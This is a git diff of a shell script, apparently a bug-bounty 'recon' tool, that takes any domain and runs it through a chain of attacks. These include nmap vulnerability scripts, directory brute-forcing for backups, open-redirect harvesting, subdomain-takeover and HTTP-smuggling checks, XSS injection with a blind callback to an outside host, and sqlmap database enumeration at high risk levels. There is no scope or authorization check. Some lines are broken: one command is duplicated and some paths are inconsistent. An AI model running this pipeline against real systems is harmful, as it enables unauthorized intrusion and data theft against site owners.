d8d4ab9b98be4b695cfbc9bb3be30f9c2c0bd922
Nihal Tikka <32479798+nihaltikka@users.noreply.github.com>
2023-03-26 18:34:08 +0530

    Update recon.sh

--- recon.sh
+++ recon.sh
@@ -15,112 +15,112 @@ banner el cazador
 
 domain=$1
 
-mkdir -p /root/Projects/$domain/
+mkdir -p ~/Projects/$domain/
 
 echo "Getting domains from crtsh"
 
-python3 /root/crtsh/crtsh.py -d $1 | anew /root/Projects/$domain/subdomains.txt
+python3 ~/crtsh/crtsh.py -d $1 | anew ~/Projects/$domain/subdomains.txt
 
 echo -e "\n Getting domains from subfinder"
 
-subfinder -d $1 -recursive | anew /root/Projects/$domain/subdomains.txt
+subfinder -d $1 -recursive | anew ~/Projects/$domain/subdomains.txt
 
 echo -e "\n Getting domains from assetfinder"
 
-assetfinder -subs-only $1 |grep -v "*." | anew /root/Projects/$domain/subdomains.txt
+assetfinder -subs-only $1 |grep -v "*." | anew ~/Projects/$domain/subdomains.txt
 
 echo -e "\n Getting domains from findomain"
 
-./findomain-linux -t $1  -u  /root/Projects/$domain/findomain_subdomains.txt
+findomain -t $1  -u  ~/Projects/$domain/findomain_subdomains.txt
 
 echo -e "\n Getting domains from Sublist3r"
 
-python3 /root/Sublist3r/sublist3r.py -d $1 -o /root/Projects/$domain/sublister_subdomains.txt
+python3 ~/Sublist3r/sublist3r.py -d $1 -o ~/Projects/$domain/sublister_subdomains.txt
 
 echo -e "\n Getting domains from Amass"
 
-amass enum -passive -d $1 -o /root/Projects/$domain/amass_subdomains.txt
+amass enum -passive -d $1 -o ~/Projects/$domain/amass_subdomains.txt
 
 echo -e "\n Getting domains for Nmap scan into allsubdomain.txt"
 
-cat /root/Projects/$domain/subdomains.txt  /root/Projects/$domain/sublister_subdomains.txt  /root/Projects/$domain/amass_subdomains.txt  /root/Projects/$domain/findomain_subdomains.txt | anew allsubdomains.txt
+cat ~/Projects/$domain/subdomains.txt  ~/Projects/$domain/sublister_subdomains.txt  ~/Projects/$domain/amass_subdomains.txt  ~/Projects/$domain/findomain_subdomains.txt | anew ~/Projects/$domain/allsubdomains.txt
 
 
 echo -e "\n Getting domains Sorted into sorted_subdomain.txt"
 
-cat /root/Projects/$domain/subdomains.txt /root/Projects/$domain/sublister_subdomains.txt  /root/Projects/$domain/amass_subdomains.txt /root/Projects/$domain/findomain_subdomains.txt| httprobe | sort -u > /root/Projects/$domain/sorted_subdomain.txt
+cat ~/Projects/$domain/subdomains.txt ~/Projects/$domain/sublister_subdomains.txt  ~/Projects/$domain/amass_subdomains.txt ~/Projects/$domain/findomain_subdomains.txt| httprobe | sort -u > ~/Projects/$domain/sorted_subdomain.txt
 
 echo -e "\n Getting all live domains into live_domains.txt"
 
-cat /root/Projects/$domain/sorted_subdomain.txt | httpx | anew /root/Projects/$domain/live_domains.txt
+cat ~/Projects/$domain/sorted_subdomain.txt | httpx | anew ~/Projects/$domain/live_domains.txt
 
 echo -e "\n NMap Scanning in Progress"
 
-nmap -sV -iL allsubdomains.txt -oN scanned-port.txt --script=vuln
+nmap -sV -iL ~/Projects/$domain/allsubdomains.txt -oN ~/Projects/$domain/scanned-port.txt --script=vuln
 
 echo -e "\n Doing a complete directory Brute Force"
 
-python3 /root/Tools/dirsearch/dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json python3 /root/Tools/dirsearch/dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json -l /root/Projects/$domain/sorted_subdomain.txt
+python3 ~/Tools/dirsearch/dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json python3 ~/Tools/dirsearch/dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json -l ~/Projects/$domain/sorted_subdomain.txt
 
 
 echo -e "\n Getting all URLS using waybackurls"
 
-cat /root/Projects/$domain/sorted_subdomain.txt | waybackurls | sort -u > /root/Projects/$domain/All_Urls.txt
+cat ~/Projects/$domain/sorted_subdomain.txt | waybackurls | sort -u > ~/Projects/$domain/All_Urls.txt
 
 echo -e "\n Getting all live URLS"
 
-cat /root/Projects/$domain/All_Urls.txt | httpx | tee -a /root/Projects/$domain/live_urls.txt
+cat ~/Projects/$domain/All_Urls.txt | httpx | tee -a ~/Projects/$domain/live_urls.txt
 
 
 echo -e "\n Getting parameter_urls"
 
-cat /root/Projects/$domain/sorted_subdomain.txt | xargs -I % python3 /root/Tools/ParamSpider/paramspider.py -l high --exclude php,svg,jpg,png,jpeg,css,woff,woff2,tif,tiff,gif,ico,pdf,txt,js -o /root/Projects/$domain/Parameters/% -d%;
+cat ~/Projects/$domain/sorted_subdomain.txt | xargs -I % python3 ~/Tools/ParamSpider/paramspider.py -l high --exclude php,svg,jpg,png,jpeg,css,woff,woff2,tif,tiff,gif,ico,pdf,txt,js -o ~/Projects/$domain/Parameters/% -d%;
 
 
 echo -e "\n Place All Parameter URLS into parameter_urls.txt and Live_parameter_urls.txt"
 
-cat /root/Projects/$domain/Parameters/* | tee  /root/Projects/$domain/param_urls.txt
+cat ~/Projects/$domain/Parameters/* | tee  ~/Projects/$domain/param_urls.txt
 
-cat /root/Projects/$domain/param_urls.txt | sort -u | tee /root/Projects/$domain/unique_param_urls.txt
+cat ~/Projects/$domain/param_urls.txt | sort -u | tee ~/Projects/$domain/unique_param_urls.txt
 
-cat /root/Projects/$domain/param_urls.txt | httpx | anew /root/Projects/$domain/live_param_urls.txt 
+cat ~/Projects/$domain/param_urls.txt | httpx | anew ~/Projects/$domain/live_param_urls.txt 
 
 
 echo "Getting openredir_urls"
 
-cat /root/Projects/$domain/All_Urls.txt  /root/Projects/$domain/param_urls.txt|egrep -e ?url= -e ?rurl -e ?next -e ?link -e ?lnk -e ?target= -e ?dest= -e ?destination= -e ?redir -e ?redirect_uri -e ?redirect_url -e /redirect/ -e ?view= -e ?login -e ?to= -e ?image_url= -e ?return= -e ?returnTo= -e ?return_to= -e ?continue= -e ?return_path= -e path= -e location= -e /out/ -e /out? -e ?go= -e ?return= -e /cgi-bin/redirect.cgi?| anew /root/Projects/$domain/openredir_urls.txt
+cat ~/Projects/$domain/All_Urls.txt  ~/Projects/$domain/param_urls.txt|egrep -e ?url= -e ?rurl -e ?next -e ?link -e ?lnk -e ?target= -e ?dest= -e ?destination= -e ?redir -e ?redirect_uri -e ?redirect_url -e /redirect/ -e ?view= -e ?login -e ?to= -e ?image_url= -e ?return= -e ?returnTo= -e ?return_to= -e ?continue= -e ?return_path= -e path= -e location= -e /out/ -e /out? -e ?go= -e ?return= -e /cgi-bin/redirect.cgi?| anew ~/Projects/$domain/openredir_urls.txt
 
 echo -e "\n Checking for Subdomain Takeover"
 
-subzy r --targets /root/Projects/$domain/sorted_subdomain.txt --concurrency 20 --hide_fails | anew /root/Projects/$domain/subdomain_takeover.txt
+subzy r --targets ~/Projects/$domain/sorted_subdomain.txt --concurrency 20 --hide_fails | anew ~/Projects/$domain/subdomain_takeover.txt
 
 
 echo -e "\n Checking for any sensitive keys/information using XKeys"
 
-cat /root/Projects/$domain/All_Urls.txt | xkeys -o /root/Projects/$domain/ | grep -v "Nothing!" | anew /root/Projects/$domain/Xkeys_output.txt
+cat ~/Projects/$domain/All_Urls.txt | xkeys -o ~/Projects/$domain/ | grep -v "Nothing!" | anew ~/Projects/$domain/Xkeys_output.txt
 
 
 echo -e "\n Checking for HTTP Smuggling"
 
-cat /root/Projects/$domain/sorted_subdomain.txt | httpx | python3  /root/Tools/smuggler/smuggler.py | anew /root/Projects/$domain/HTTP_smuggling.txt
+cat ~/Projects/$domain/sorted_subdomain.txt | httpx | python3  /root/Tools/smuggler/smuggler.py | anew ~/Projects/$domain/HTTP_smuggling.txt
 
 
 #echo -e "\n Checking for LFI"
 
-#cat /root/Projects/$domain/All_Urls.txt |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w /root/el_cazador/LFI.txt ; done
+#cat ~/Projects/$domain/All_Urls.txt |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/el_cazador/LFI.txt ; done
 
 echo -e "\n Checking for XSS"
 
-cat /root/Projects/$domain/All_Urls.txt |httpx| kxss | sed 's/=.*/=/' | sed 's/^.*http/http/' | dalfox pipe -b  https://elcazador.bxss.in
+cat ~/Projects/$domain/All_Urls.txt |httpx| kxss | sed 's/=.*/=/' | sed 's/^.*http/http/' | dalfox pipe -b  https://elcazador.bxss.in | tee ~/Project/$domain/xss_output.txt
 
 echo -e "\n Checking for SQLI"
 
-gf sqli /root/Projects/$domain/All_Urls.txt >> sqli.txt ; sqlmap -m /root/Projects/$domain/sqli.txt --dbs --banner --batch --risk 3 --level 3
+gf sqli ~/Projects/$domain/All_Urls.txt >> sqli.txt ; sqlmap -m ~/Projects/$domain/sqli.txt --dbs --banner --batch --risk 3 --level 3
 
 echo -e "\n Checking Nuclei Results"
 
-nuclei -l /root/Projects/$domain/sorted_subdomain.txt -o /root/Projects/$domain/nuclei_result.txt
+nuclei -l ~/Projects/$domain/sorted_subdomain.txt -o ~/Projects/$domain/nuclei_result.txt
 
 echo -e "\n Checking for GitHub Dorks"
 
-python3  /root/el_cazador/GitDorker/GitDorker.py -t  "Add Your GitHub Token"  -org $domain -d  /root/el_cazador/githubdork.txt  -o  /root/Projects/$domain/githubdork.txt
+python3  ~/el_cazador/GitDorker/GitDorker.py -t  "Add Your GitHub Token"  -org $domain -d  ~/el_cazador/githubdork.txt  -o  ~/Projects/$domain/githubdork.txt
